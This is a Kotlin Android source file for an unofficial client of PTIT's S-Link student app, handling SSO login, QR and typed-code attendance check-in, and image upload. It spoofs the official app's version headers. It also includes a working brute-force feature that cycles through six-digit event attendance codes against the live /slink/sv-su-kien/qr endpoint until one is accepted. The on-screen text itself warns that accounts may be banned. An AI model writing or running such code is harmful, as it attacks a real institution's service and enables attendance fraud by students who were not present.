package com.ptit.slinkmini

import android.app.AlertDialog
import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.graphics.BitmapFactory
import android.net.Uri
import android.os.Bundle
import android.provider.OpenableColumns
import android.text.InputType
import android.view.View
import android.widget.*
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import com.google.zxing.BinaryBitmap
import com.google.zxing.MultiFormatReader
import com.google.zxing.RGBLuminanceSource
import com.google.zxing.common.HybridBinarizer
import com.journeyapps.barcodescanner.ScanContract
import com.journeyapps.barcodescanner.ScanOptions
import org.json.JSONArray
import org.json.JSONObject

class MainActivity : AppCompatActivity() {

    private lateinit var session: Session
    private lateinit var status: TextView
    private lateinit var loginBox: LinearLayout
    private lateinit var homeBox: LinearLayout
    private lateinit var settingsBox: LinearLayout
    private lateinit var manualQr: EditText
    private lateinit var partIn: EditText
    private lateinit var tokenIn: EditText
    private lateinit var uploadResult: TextView

    // Version khớp app gốc hiện tại
    private val appVersionName = "2.3.9"
    private val appVersionCode = "80075"

    // Trạng thái cho từng luồng
    private enum class Flow { NONE, CAMERA_SCAN, IMAGE_QR }
    private var flow = Flow.NONE

    // Bruteforce
    @Volatile private var bruteCancel = false
    private var bruteThread: Thread? = null

    // ========== Launchers ==========
    private val scanLauncher = registerForActivityResult(ScanContract()) { r ->
        val content = r.contents
        val mode = flow
        flow = Flow.NONE
        if (content == null) return@registerForActivityResult
        when (mode) {
            Flow.CAMERA_SCAN -> {
                status.text = "✅ Đã quét QR\nĐang điểm danh…"
                doCheckIn(content)
            }
            else -> doCheckIn(content)
        }
    }

    private val pickImageLauncher = registerForActivityResult(
        ActivityResultContracts.GetContent()
    ) { uri: Uri? ->
        val mode = flow
        flow = Flow.NONE
        if (uri == null) return@registerForActivityResult
        when (mode) {
            Flow.IMAGE_QR -> decodeQrThenCheckin(uri)
            else -> doUploadOnly(uri)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        session = Session(this)
        setContentView(buildUi())
        handleIntent(intent)
        refreshUi()
        if (session.isLoggedIn()) preparePartition()
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        handleIntent(intent)
    }

    // ========== SSO ==========
    private fun handleIntent(intent: Intent) {
        val data = intent.data ?: return
        if (data.scheme == "ptit.auth" && data.host == "SignIn") {
            val code = data.getQueryParameter("code")
            val state = data.getQueryParameter("state")
            val error = data.getQueryParameter("error")
            val errorDesc = data.getQueryParameter("error_description")
            if (error != null) { status.text = "SSO lỗi: $error\n${errorDesc.orEmpty()}"; return }
            if (code.isNullOrBlank()) { status.text = "Không nhận được code"; return }
            if (state != session.pendingState) { status.text = "State mismatch"; return }
            exchangeCodeForToken(code)
        }
    }

    // ========== UI ==========
    private fun buildUi(): View {
        val scroll = ScrollView(this)
        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(48, 96, 48, 48)
        }
        scroll.addView(root)
        root.addView(TextView(this).apply {
            text = "PTIT S-Link Mini"; textSize = 22f; setPadding(0, 0, 0, 24)
        })

        // ---- Login ----
        loginBox = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL }
        loginBox.addView(Button(this).apply {
            text = "Đăng nhập qua SSO"; setOnClickListener { startSso() }
        })
        loginBox.addView(Button(this).apply {
            text = "Đã có token — Settings"; setOnClickListener { showSettings() }
        })
        root.addView(loginBox)

        // ---- Home ----
        homeBox = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL; visibility = View.GONE
        }

        // ===== Khối 1: 3 tính năng chính =====
        homeBox.addView(sectionHeader("Điểm danh sự kiện"))
        homeBox.addView(Button(this).apply {
            text = "📷 Quét QR bằng camera"
            setOnClickListener { startCameraScan() }
        })
        homeBox.addView(Button(this).apply {
            text = "⌨️ Nhập mã điểm danh"
            setOnClickListener { showManualDialog() }
        })
        homeBox.addView(Button(this).apply {
            text = "🖼️ Trích mã từ ảnh QR"
            setOnClickListener { startImageQr() }
        })

        // ===== Khối 2: Điểm danh không ảnh (dự phòng) =====
        homeBox.addView(sectionHeader("Điểm danh không ảnh"))
        manualQr = EditText(this).apply { hint = "Dán chuỗi QR (dự phòng)" }
        homeBox.addView(manualQr)
        homeBox.addView(Button(this).apply {
            text = "Điểm danh từ chuỗi QR đã dán"
            setOnClickListener {
                val s = manualQr.text.toString().trim()
                if (s.isNotEmpty()) doCheckIn(s)
            }
        })

        // ===== Khối 3: Tiện ích =====
        homeBox.addView(sectionHeader("Tiện ích"))
        homeBox.addView(Button(this).apply {
            text = "📤 Upload ảnh (không điểm danh)"
            setOnClickListener { flow = Flow.NONE; pickImageLauncher.launch("image/*") }
        })
        uploadResult = TextView(this).apply {
            textSize = 12f; setTextIsSelectable(true); setPadding(0, 8, 0, 8)
        }
        homeBox.addView(uploadResult)
        homeBox.addView(Button(this).apply {
            text = "Copy kết quả upload"
            setOnClickListener {
                val t = uploadResult.text.toString()
                if (t.isNotBlank()) {
                    (getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager)
                        .setPrimaryClip(ClipData.newPlainText("result", t))
                    Toast.makeText(this@MainActivity, "Đã copy", Toast.LENGTH_SHORT).show()
                }
            }
        })
        homeBox.addView(Button(this).apply {
            text = "🔍 Bruteforce mã (cảnh báo: có thể bị ban)"
            setOnClickListener { showBruteforceDialog() }
        })

        // ===== Khối 4: Tài khoản =====
        homeBox.addView(sectionHeader("Tài khoản"))
        homeBox.addView(Button(this).apply {
            text = "Settings"; setOnClickListener { showSettings() }
        })
        homeBox.addView(Button(this).apply {
            text = "Đăng xuất"
            setOnClickListener {
                session.clear(); refreshUi(); status.text = "Đã đăng xuất"
            }
        })
        root.addView(homeBox)

        // ---- Settings ----
        settingsBox = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL; visibility = View.GONE
        }
        tokenIn = EditText(this).apply {
            hint = "Paste access_token"; inputType = InputType.TYPE_CLASS_TEXT
        }
        partIn = EditText(this).apply { hint = "x-data-partition-code" }
        settingsBox.addView(tokenIn); settingsBox.addView(partIn)
        settingsBox.addView(Button(this).apply {
            text = "Lưu"
            setOnClickListener {
                val t = tokenIn.text.toString().trim()
                if (t.isNotBlank()) session.accessToken = t
                session.partitionCode = partIn.text.toString().trim()
                status.text = "Đã lưu"; refreshUi()
                if (session.isLoggedIn()) preparePartition()
            }
        })
        settingsBox.addView(Button(this).apply {
            text = "Quay lại"; setOnClickListener { refreshUi() }
        })
        root.addView(settingsBox)

        status = TextView(this).apply {
            textSize = 12f; setPadding(0, 20, 0, 0); setTextIsSelectable(true)
        }
        root.addView(status)
        return scroll
    }

    private fun sectionHeader(text: String): TextView = TextView(this).apply {
        this.text = text
        textSize = 16f
        setPadding(0, 24, 0, 8)
    }

    private fun refreshUi() {
        val logged = session.isLoggedIn()
        loginBox.visibility = if (logged) View.GONE else View.VISIBLE
        homeBox.visibility = if (logged) View.VISIBLE else View.GONE
        settingsBox.visibility = View.GONE
        partIn.setText(session.partitionCode)
    }

    private fun showSettings() {
        loginBox.visibility = View.GONE; homeBox.visibility = View.GONE
        settingsBox.visibility = View.VISIBLE
        tokenIn.setText(""); partIn.setText(session.partitionCode)
    }

    // ========== SSO ==========
    private fun startSso() {
        val verifier = Pkce.newCodeVerifier()
        val challenge = Pkce.challenge(verifier)
        val state = Pkce.newState()
        session.pendingVerifier = verifier; session.pendingState = state
        val url = Uri.parse(Config.AUTH_ENDPOINT).buildUpon()
            .appendQueryParameter("response_type", "code")
            .appendQueryParameter("client_id", Config.CLIENT_ID)
            .appendQueryParameter("redirect_uri", Config.REDIRECT_URI)
            .appendQueryParameter("scope", Config.SCOPE)
            .appendQueryParameter("state", state)
            .appendQueryParameter("code_challenge", challenge)
            .appendQueryParameter("code_challenge_method", "S256")
            .build().toString()
        status.text = "Đang mở SSO…"
        try { startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(url))) }
        catch (e: Exception) { status.text = "Không mở được browser: ${e.message}" }
    }

    private fun exchangeCodeForToken(code: String) {
        val verifier = session.pendingVerifier
        if (verifier.isBlank()) { status.text = "Không có code_verifier"; return }
        val form = mapOf(
            "grant_type" to "authorization_code", "client_id" to Config.CLIENT_ID,
            "code" to code, "redirect_uri" to Config.REDIRECT_URI,
            "code_verifier" to verifier
        )
        Api.postForm(Config.TOKEN_ENDPOINT, form) { ok, body ->
            runOnUiThread {
                if (!ok) { status.text = "Đổi code lỗi: $body"; return@runOnUiThread }
                try {
                    val j = JSONObject(body)
                    session.accessToken = j.optString("access_token")
                    session.refreshToken = j.optString("refresh_token")
                    session.idToken = j.optString("id_token")
                    session.expiresAt = System.currentTimeMillis() + j.optLong("expires_in", 300) * 1000
                    session.pendingVerifier = ""; session.pendingState = ""
                    status.text = "Đăng nhập OK"; refreshUi(); preparePartition()
                } catch (e: Exception) { status.text = "Parse token lỗi: ${e.message}" }
            }
        }
    }

    private fun refreshAccessToken(onDone: (Boolean) -> Unit) {
        val rt = session.refreshToken
        if (rt.isBlank()) { onDone(false); return }
        val form = mapOf(
            "grant_type" to "refresh_token", "client_id" to Config.CLIENT_ID,
            "refresh_token" to rt
        )
        Api.postForm(Config.TOKEN_ENDPOINT, form) { ok, body ->
            runOnUiThread {
                if (!ok) { onDone(false); return@runOnUiThread }
                try {
                    val j = JSONObject(body)
                    session.accessToken = j.optString("access_token", session.accessToken)
                    session.refreshToken = j.optString("refresh_token", session.refreshToken)
                    session.expiresAt = System.currentTimeMillis() + j.optLong("expires_in", 300) * 1000
                    onDone(true)
                } catch (_: Exception) { onDone(false) }
            }
        }
    }

    // ========== Partition ==========
    private fun preparePartition() {
        val fromJwt = partitionFromJwt()
        if (fromJwt.isNotBlank()) { session.partitionCode = fromJwt; return }
        getWithAuth("/core/data-partition/user/many/me") { ok, body ->
            if (ok) try {
                val arr = JSONArray(body)
                if (arr.length() > 0) {
                    val o = arr.getJSONObject(0)
                    val code = o.optString("code").ifBlank {
                        o.optString("dataPartitionCode").ifBlank {
                            o.optString("ma").ifBlank { o.optString("id") }
                        }
                    }
                    if (code.isNotBlank()) session.partitionCode = code
                }
            } catch (_: Exception) {}
        }
    }

    private fun partitionFromJwt(): String = try {
        val parts = session.accessToken.split(".")
        if (parts.size < 2) "" else {
            val payload = String(android.util.Base64.decode(
                parts[1],
                android.util.Base64.URL_SAFE or android.util.Base64.NO_PADDING or android.util.Base64.NO_WRAP
            ))
            val o = JSONObject(payload)
            o.optString("partition_code").ifBlank {
                o.optString("partitionCode").ifBlank {
                    o.optString("data_partition_code").ifBlank {
                        val a = o.optJSONArray("partition_codes")
                        if (a != null && a.length() > 0) a.getString(0) else ""
                    }
                }
            }
        }
    } catch (_: Exception) { "" }

    // ========== Headers ==========
    private fun authHeaders(): Map<String, String> {
        val h = mutableMapOf(
            "Authorization" to "Bearer ${session.accessToken}",
            "Content-Type" to "application/json",
            "Accept" to "application/json",
            "Accept-Language" to "vi-VN,vi;q=0.9,en;q=0.8",
            "X-App-Version" to appVersionName,
            "X-Client-Version" to appVersionName,
            "X-Version" to appVersionName,
            "App-Version" to appVersionName,
            "X-App-VersionCode" to appVersionCode,
            "X-Client-VersionCode" to appVersionCode,
            "X-App-Platform" to "android",
            "X-Platform" to "android",
            "X-Client-Id" to Config.CLIENT_ID,
            "User-Agent" to "PTIT-S-Link/$appVersionName (Android; $appVersionCode)"
        )
        if (session.partitionCode.isNotBlank()) h["x-data-partition-code"] = session.partitionCode
        return h
    }

    private fun getWithAuth(path: String, onResult: (Boolean, String) -> Unit) =
        requestWithAuth("GET", path, null, onResult)

    private fun postWithAuth(path: String, body: String, onResult: (Boolean, String) -> Unit) =
        requestWithAuth("POST", path, body, onResult)

    private fun requestWithAuth(method: String, path: String, body: String?,
                                onResult: (Boolean, String) -> Unit) {
        val url = Config.API_URL.trimEnd('/') + "/" + path.trimStart('/')
        val cb: (Boolean, String) -> Unit = { ok, resp ->
            if (!ok && (resp.contains("401") || resp.contains("TokenInvalid", true))) {
                refreshAccessToken { refreshed ->
                    if (refreshed) requestWithAuth(method, path, body, onResult)
                    else onResult(false, resp)
                }
            } else onResult(ok, resp)
        }
        if (method == "GET") Api.get(url, authHeaders(), cb)
        else Api.postJson(url, body ?: "{}", authHeaders(), cb)
    }

    // ========== TÍNH NĂNG 1: Quét QR bằng camera ==========
    private fun startCameraScan() {
        flow = Flow.CAMERA_SCAN
        status.text = "Đưa QR sự kiện vào khung"
        startScan()
    }

    // ========== TÍNH NĂNG 2: Nhập mã ==========
    private fun showManualDialog() {
        val input = EditText(this).apply {
            hint = "Mã điểm danh (VD: 156485)"
            inputType = InputType.TYPE_CLASS_NUMBER
        }
        AlertDialog.Builder(this)
            .setTitle("Nhập mã điểm danh")
            .setMessage("Mã hiển thị tại sự kiện. App gốc chỉ cần mã này là đủ.")
            .setView(input)
            .setPositiveButton("Điểm danh") { _, _ ->
                val code = input.text.toString().trim()
                if (code.isBlank()) { status.text = "Chưa nhập mã"; return@setPositiveButton }
                doCheckInWithMa(code)
            }
            .setNegativeButton("Huỷ", null)
            .show()
    }

    // ========== TÍNH NĂNG 3: Trích mã từ ảnh QR ==========
    private fun startImageQr() {
        flow = Flow.IMAGE_QR
        status.text = "Chọn ảnh có chứa QR sự kiện"
        pickImageLauncher.launch("image/*")
    }

    private fun decodeQrThenCheckin(uri: Uri) {
        status.text = "Đang đọc ảnh và giải mã QR…"
        try {
            val bytes = contentResolver.openInputStream(uri)?.use { it.readBytes() }
            if (bytes == null || bytes.isEmpty()) { status.text = "Không đọc được ảnh"; return }
            val decodedQr = decodeQrFromBytes(bytes)
            if (decodedQr == null) {
                status.text = "❌ Không tìm thấy QR trong ảnh.\nThử ảnh rõ hơn hoặc dùng 'Nhập mã'."
                return
            }
            doCheckIn(decodedQr)
        } catch (e: Exception) {
            status.text = "Lỗi đọc ảnh: ${e.message}"
        }
    }

    private fun decodeQrFromBytes(bytes: ByteArray): String? {
        return try {
            val bmp = BitmapFactory.decodeByteArray(bytes, 0, bytes.size) ?: return null
            val w = bmp.width; val h = bmp.height
            val pixels = IntArray(w * h)
            bmp.getPixels(pixels, 0, w, 0, 0, w, h)
            val source = RGBLuminanceSource(w, h, pixels)
            val binary = BinaryBitmap(HybridBinarizer(source))
            MultiFormatReader().decode(binary).text
        } catch (_: Exception) { null }
    }

    // ========== ĐIỂM DANH — body đúng app gốc ==========
    private fun doCheckInWithMa(ma: String) {
        val body = JSONObject()
            .put("ma", ma)
            .put("loaiQR", "Tham gia")
            .toString()
        status.text = "Đang check-in sự kiện…\nma=$ma"
        postWithAuth("/slink/sv-su-kien/qr", body) { ok, resp ->
            runOnUiThread {
                if (ok) status.text = "✅ Điểm danh thành công\n$resp"
                else status.text = "❌ Lỗi: $resp\n\nma=$ma"
            }
        }
    }

    private fun doCheckIn(qr: String) {
        val parsed = QrParser.parse(qr)
        if (parsed == null) { status.text = "QR không hợp lệ:\n$qr"; return }
        status.text = "Đang xử lý: ${parsed.module}|${parsed.action}"
        when {
            parsed.module == "SU_KIEN" && parsed.action == "CHECK_IN" -> {
                try {
                    val ma = JSONObject(parsed.data).optString("maDiemDanh")
                    if (ma.isBlank()) { status.text = "QR thiếu maDiemDanh"; return }
                    doCheckInWithMa(ma)
                } catch (e: Exception) { status.text = "Parse QR lỗi: ${e.message}" }
            }
            parsed.action.contains("DIEM_DANH", true) -> {
                val otp = parsed.otp.orEmpty().trim()
                if (otp.isBlank()) { status.text = "QR lớp không có otp"; return }
                val maNhomQr = extractMaNhomQr(parsed.data)
                val body = JSONObject().put("otp", otp).put("maNhomQr", maNhomQr).toString()
                status.text = "Đang điểm danh lớp…\notp=$otp\nmaNhomQr=$maNhomQr"
                postWithAuth("/qldt/diem-danh/user/qr", body) { ok, resp ->
                    runOnUiThread {
                        if (ok) status.text = "✅ Điểm danh lớp thành công\n$resp"
                        else status.text = "❌ Lỗi: $resp\n\nQR: $qr"
                    }
                }
            }
            else -> status.text = "Chưa hỗ trợ: ${parsed.module}|${parsed.action}\n$qr"
        }
    }

    private fun startScan() {
        val o = ScanOptions()
        o.setDesiredBarcodeFormats(ScanOptions.QR_CODE)
        o.setPrompt("Đưa QR điểm danh vào khung")
        o.setBeepEnabled(false); o.setOrientationLocked(false)
        scanLauncher.launch(o)
    }

    private fun extractMaNhomQr(data: String): String {
        try {
            val o = JSONObject(data)
            for (k in listOf("maNhomQr", "ma_nhom_qr", "nhomQr", "ma"))
                if (o.has(k)) return o.getString(k)
        } catch (_: Exception) {}
        try {
            val raw = String(android.util.Base64.decode(data, android.util.Base64.DEFAULT))
            val o = JSONObject(raw)
            if (o.has("maNhomQr")) return o.getString("maNhomQr")
        } catch (_: Exception) {}
        return data
    }

    // ========== Upload ảnh không điểm danh ==========
    private fun doUploadOnly(uri: Uri) {
        uploadResult.text = "Đang đọc ảnh…"
        try {
            val resolver = contentResolver
            var displayName = "image.jpg"
            val mime = resolver.getType(uri) ?: "image/jpeg"
            resolver.query(uri, null, null, null, null)?.use { c ->
                if (c.moveToFirst()) {
                    val idx = c.getColumnIndex(OpenableColumns.DISPLAY_NAME)
                    if (idx >= 0) displayName = c.getString(idx) ?: displayName
                }
            }
            val bytes = resolver.openInputStream(uri)?.use { it.readBytes() }
            if (bytes == null || bytes.isEmpty()) { uploadResult.text = "Không đọc được ảnh"; return }
            uploadResult.text = "Đang upload (${bytes.size / 1024} KB)…"
            val url = Config.API_URL.trimEnd('/') + "/slink/file"
            val headers = authHeaders().toMutableMap().apply { remove("Content-Type") }
            Api.uploadFile(url, bytes, displayName, mime, headers, "file") { ok, resp ->
                runOnUiThread {
                    if (!ok) { uploadResult.text = "❌ Upload lỗi\n$resp"; return@runOnUiThread }
                    try {
                        val fileId = JSONObject(resp).getJSONObject("data")
                            .getJSONObject("file").getString("_id")
                        session.lastUploadedFileId = fileId
                        uploadResult.text = "✅ Upload OK (fileId=$fileId)\n$resp"
                    } catch (_: Exception) { uploadResult.text = "✅ Upload OK\n$resp" }
                }
            }
        } catch (e: Exception) { uploadResult.text = "Lỗi: ${e.message}" }
    }

    // ========== BRUTEFORCE (utility, cảnh báo) ==========
    private fun showBruteforceDialog() {
        if (bruteThread?.isAlive == true) {
            AlertDialog.Builder(this)
                .setTitle("Bruteforce đang chạy")
                .setMessage("Bạn muốn dừng?")
                .setPositiveButton("Dừng") { _, _ ->
                    bruteCancel = true
                    status.text = "Đã yêu cầu dừng bruteforce…"
                }
                .setNegativeButton("Tiếp tục", null)
                .show()
            return
        }

        val container = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(48, 16, 48, 0)
        }
        val startIn = EditText(this).apply {
            hint = "Từ (mặc định 150000)"; inputType = InputType.TYPE_CLASS_NUMBER
        }
        val endIn = EditText(this).apply {
            hint = "Đến (mặc định 160000)"; inputType = InputType.TYPE_CLASS_NUMBER
        }
        val delayIn = EditText(this).apply {
            hint = "Delay ms (mặc định 100 = ~10 req/s)"
            inputType = InputType.TYPE_CLASS_NUMBER
        }
        container.addView(startIn)
        container.addView(endIn)
        container.addView(delayIn)
        container.addView(TextView(this).apply {
            text = "⚠️ Bruteforce 1M mã sẽ mất hàng giờ và gần như chắc chắn bị ban tài khoản.\n" +
                   "Khuyến nghị: chạy range hẹp 150000-160000 trước (10K mã, ~17 phút ở 100ms)."
            textSize = 11f
            setPadding(0, 16, 0, 0)
        })

        AlertDialog.Builder(this)
            .setTitle("Bruteforce mã điểm danh")
            .setView(container)
            .setPositiveButton("Chạy") { _, _ ->
                val start = startIn.text.toString().trim().toIntOrNull() ?: 150000
                val end = endIn.text.toString().trim().toIntOrNull() ?: 160000
                val delay = delayIn.text.toString().trim().toLongOrNull() ?: 100L
                if (start < 0 || end > 999999 || start > end) {
                    status.text = "Range không hợp lệ (0–999999, start ≤ end)"
                    return@setPositiveButton
                }
                startBruteforce(start, end, delay)
            }
            .setNegativeButton("Huỷ", null)
            .show()
    }

    private fun startBruteforce(start: Int, end: Int, delayMs: Long) {
        bruteCancel = false
        val total = end - start + 1
        status.text = "Bruteforce $start..$end ($total mã), delay ${delayMs}ms"

        bruteThread = Thread {
            var tried = 0
            var i = start
            while (i <= end && !bruteCancel) {
                val ma = i.toString().padStart(6, '0')
                val latch = java.util.concurrent.CountDownLatch(1)
                var success = false
                var respCopy = "TIMEOUT"

                postWithAuth(
                    "/slink/sv-su-kien/qr",
                    JSONObject().put("ma", ma).put("loaiQR", "Tham gia").toString()
                ) { ok, resp ->
                    success = ok
                    respCopy = resp
                    latch.countDown()
                }

                latch.await(15, java.util.concurrent.TimeUnit.SECONDS)
                tried++

                val finalMa = ma
                val finalSuccess = success
                val finalResp = respCopy
                val finalTried = tried
                runOnUiThread {
                    status.text = "[$finalTried/$total] ma=$finalMa\n" +
                        if (finalSuccess) "🎯 SUCCESS: ${finalResp.take(300)}"
                        else "resp: ${finalResp.take(150)}"
                }

                if (success && finalResp.contains("\"success\":true")) {
                    runOnUiThread { status.text = "🎯 Tìm thấy ma=$finalMa\n$finalResp" }
                    return@Thread
                }

                if (finalResp.contains("429") || finalResp.contains("Too Many", true) ||
                    finalResp.contains("rate limit", true)) {
                    runOnUiThread { status.text = "⚠️ Rate limit tại ma=$finalMa\nĐã dừng." }
                    return@Thread
                }

                try { Thread.sleep(delayMs) } catch (_: InterruptedException) { return@Thread }
                i++
            }

            runOnUiThread {
                status.text = if (bruteCancel) "Đã dừng bruteforce (thử $tried mã)"
                              else "Hoàn tất (thử $tried mã, không tìm thấy)"
            }
        }.start()
    }
}
